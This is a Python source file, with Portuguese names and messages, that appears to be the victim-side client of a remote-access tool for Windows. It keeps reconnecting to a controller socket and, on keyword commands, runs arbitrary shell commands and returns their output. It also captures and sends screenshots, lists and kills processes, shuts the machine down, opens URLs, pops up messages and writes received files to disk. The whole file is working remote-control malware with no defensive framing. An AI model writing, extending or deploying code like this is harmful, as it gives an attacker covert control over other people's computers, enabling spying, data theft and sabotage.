import socket as ss
from threading import Thread
import os
from pyautogui import alert, screenshot
import psutil as ps
import webbrowser
import io
import ctypes
from time import sleep


class Idd:
    def __init__(self):
        while True:
            try:
                with ss.socket(ss.AF_INET, ss.SOCK_STREAM) as self.__idle:
                    self.__idle.connect((ss.gethostname(), 53361))
                    if not self.receber():
                        continue

            except ss.error:
                self.__idle.close()
                continue

            except ConnectionAbortedError:
                self.__idle.close()
                continue

            except ConnectionResetError:
                self.__idle.close()
                continue

            except Exception:
                self.__idle.close()
                continue

    def receber(self):
        while True:
            path = self.__idle.recv(1024)
            if not path:
                return False
            else:
                path = path.decode("utf-8")
                if "\\" in path:
                    pato = path.split("\\")

                    if "killterminalpidprocess" in pato:
                        self.__fechar(pato[1])
                        continue

                    if "showpopupinwindow" in pato:
                        self.__process_pop(pato[1])
                        continue

                    if "siteentering" in pato:
                        Thread(target=self.__site, args=(pato[1],)).start()
                        continue

                    if "terminalcommandexecute" in pato:
                        Thread(target=self.__terminal_, args=(pato[1],)).start()

                    if "sendfilearquivemidiaorfile" in pato:
                        Thread(target=self.__file_recv,args=(pato[1],)).start()
                        continue

                else:
                    if path == "shutdowncomputersystem":
                        self.__desligar()
                        continue

                    if path == "chatchallprocesslistandsend":
                        self.__process_list()
                        continue

                    if path == "printscreensendconfirmationsignal":
                        Thread(target=self.__system_photo).start()
                        continue

                    if path == "windowkillblackandshutdown":
                        Thread(target=self.__window_change_config).start()
                        continue

    def __site(self, sitee):
        webbrowser.open(url=sitee, new=1)
        self.__idle.send(bytes("Site aberto", "utf-8"))
        self.receber()

    def __desligar(self):
        try:
            os.system("shutdown -s -t 5")
            self.__idle.send(bytes("Comando executado", "utf-8"))
            self.receber()
        except Exception:
            self.__idle.send(bytes("Error\n\n", "utf-8"))

    def __fechar(self, processo):
        os.system(f"TASKKILL /IM {processo}")
        self.__idle.send(bytes(f"{processo} Fechado", "utf-8"))
        self.receber()

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __process_pop(self, msg):
        try:
            alert(msg)
        except Exception:
            try:
                os.system(f'echo msgbox "{msg}" > %tmp%\\tmp.vbs')
                os.system('cscript /nologo %tmp%\\tmp.vbs')
                os.system('del %tmp%\\tmp.vbs')
            except Exception:
                self.__idle.send(bytes("Error\n\n", "utf-8"))

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #
    def __process_list(self):
        processos = list()
        for proc in ps.process_iter():
            if not proc.name() in processos:
                processos.append(proc.name())
        self.__idle.send(bytes(f"{processos}", "utf-8"))
        self.receber()

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __system_photo(self):
        try:
            foto = screenshot()
            f = io.BytesIO()
            foto.save(f, 'PNG')
            self.__idle.send(bytes(f.getvalue()))
            sleep(0.5)
            self.__idle.send(bytes(f"", "utf-8"))

        except Exception:
            self.__idle.send(bytes("Error\n\n", "utf-8"))

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __file_recv(self, name):
        while True:
            self.__idle.send(bytes("Ready", "utf-8"))
            with open("C:\\Users\\Public\\Documents\\Public_Docs\\file.png", "wb") as wall:
                while True:
                    photo = self.__idle.recv(10000)
                    if not photo:
                        break
                    wall.write(photo)
                    continue

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __terminal_(self, command):
        try:
            resposta = os.popen(command).read()
            self.__idle.send(bytes(resposta, "utf-8"))
        except Exception:
            self.__idle.send(bytes("Error\n\n", "utf-8"))

    # -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= #

    def __window_system_shutdown(self, command):
        try:
            resposta = os.popen(command).read()
            self.__idle.send(bytes(resposta, "utf-8"))
        except Exception:
            self.__idle.send(bytes("Error\n\n", "utf-8"))


Idd()
